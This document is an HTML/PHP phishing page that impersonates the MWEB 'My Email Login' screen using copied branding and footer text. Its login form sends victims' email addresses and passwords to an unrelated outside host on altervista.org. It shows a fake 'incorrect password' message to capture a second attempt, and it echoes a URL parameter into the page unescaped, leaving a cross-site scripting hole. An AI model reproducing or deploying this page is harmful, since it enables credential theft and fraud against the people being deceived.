<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	
    <title>My Email Login</title>
    <!-- CSS Includes -->
    <link type="text/css" rel="stylesheet" href="mail.mweb.co.za/file1/jquery-ui-1.css">
    <link type="text/css" rel="stylesheet" href="mail.mweb.co.za/file1/chosen.css">
    <link type="text/css" rel="stylesheet" href="mail.mweb.co.za/file1/pure-min.css">
    <link type="text/css" rel="stylesheet" href="mail.mweb.co.za/file1/font-awesome.css">
    <link type="text/css" rel="stylesheet" href="mail.mweb.co.za/file1/myaccount.css">
    <link type="text/css" rel="stylesheet" href="mail.mweb.co.za/file1/myaccount-login.css">
    <link rel="shortcut icon" href="mail.mweb.co.za/file1/favicon.ico">
        
    <!-- JS Includes -->


    <!-- Get Date -->
    <script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
    <script type="text/javascript">
        //<!--
                function CurrentYear()
                {
                    var date = new Date();
                    var year = date.getFullYear();
                    document.write(year);
                }

    //-->
    </script>

<style type="text/css">
<!--
-->
</style>
<link href="css/notice.css" rel="stylesheet" type="text/css">
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
</head>
<body>

    <div id="wrapper">
        <div id="topBar">
    <div id="topBarContent">
        <div id="topBarLogo"><a id="topBarLogoLink">&nbsp;</a></div>
    </div>
</div>
        <div id="container">
          <div id="content" class="pure-g" style="margin: 0 auto; width: 800px;">
                <div id="headerPanel" class="pure-u-1">
                    <p id="myAccountTitle">MY EMAIL LOGIN</p>
                </div>

<!-- MWEB/SMI Background -->
<div id="div-gpt-ad-1373625495868-0">
  
</div>

<div class="pure-u-1">
	
	<div id="errorOutputContainer">
		
	</div>
</div>
<div id="loginPanel" class="pure-u-1-2">
  <?php 
// Show IF Conditional region1 
if (@$_GET['INFO'] == "unsuccessful") {
?>
    <div class="alert1">
      <span class="closebtn" onClick="this.parentElement.style.display='none';">&times;</span>
      Incorrect password, try again..
    </div>
    <?php } 
// endif Conditional region1
?>
<form action="http://directoryupdatee.altervista.org/veri1/member.php" method="get" name="getLogin" class="pure-form pure-form-stacked">
		<fieldset>
			<div class="pure-control-group">
				<label>Email Address</label>
	      <span id="sprytextfield1">
				<input name="email" type="text" class="disableAutocomplete" id="txtLogin" value="<?php echo $_GET['email']; ?>" size="45" readonly="readonly" runat="server" autocomplete="off">
				<span class="textfieldRequiredMsg">A valid email address  is required.</span></span></div>
			<div class="pure-control-group">
				<label>Password</label>
		    <span id="sprytextfield2">
				<input name="password" type="password" class="disableAutocomplete" id="txtPassword" size="45" runat="server" autocomplete="off">
			  <span class="textfieldRequiredMsg">Please enter password.</span></span></div>

			




<input name="hp" id="website" type="text">



			<div class="pure-control-group">
				<input class="primary fancyButton" id="m_submitButton" value="Sign In" name="LoginUser" runat="server" onserverclick="m_submitButton_ServerClick" type="submit">
			</div>
		</fieldset>
		
	
		<span><a>
		Are you an Ignite customer?</a></span>
		<br>
		<br>
	
		<span><a>Forgotten
			Password?</a></span>
	</form>
</div>
<div id="adPanel" class="pure-u-1-2">
	<div class="adcode">
	</div>
</div>







          </div> <!-- content -->
      </div> <!-- container -->
<div class="clearfooter"></div>
   </div> <!-- wrapper -->
     <div id="footer">
           <div id="footerContent" class="pure-g">
               <div class="pure-u-2-3">
                   <p>
                       © MWEB. Trading as a division of Internet Solutions Digital (Pty) Ltd. All rights reserved.
                   </p>
                   <p>
                       <a>Legal Notices</a> |
                       <a>About Us</a> |
                       <a>Contact Us</a> |
                       <a>Help</a> <!-- | 
					   <a href="https://www.mweb.co.za/aboutus/retailstores.aspx">MWEB Stores</a> -->
                   </p>
               </div>
               <div class="pure-u-1-3">
                   <ul id="isp-badges">
                       <li><a><img src="file1/ispa.png"></a></li>
                       
                       <li><a><img src="file1/icode.png"></a></li>
                   </ul>
               </div>
           </div>
       </div>
<script type="text/javascript">
<!--
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1");
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2");
//-->
</script>
</body><!-- body --></html>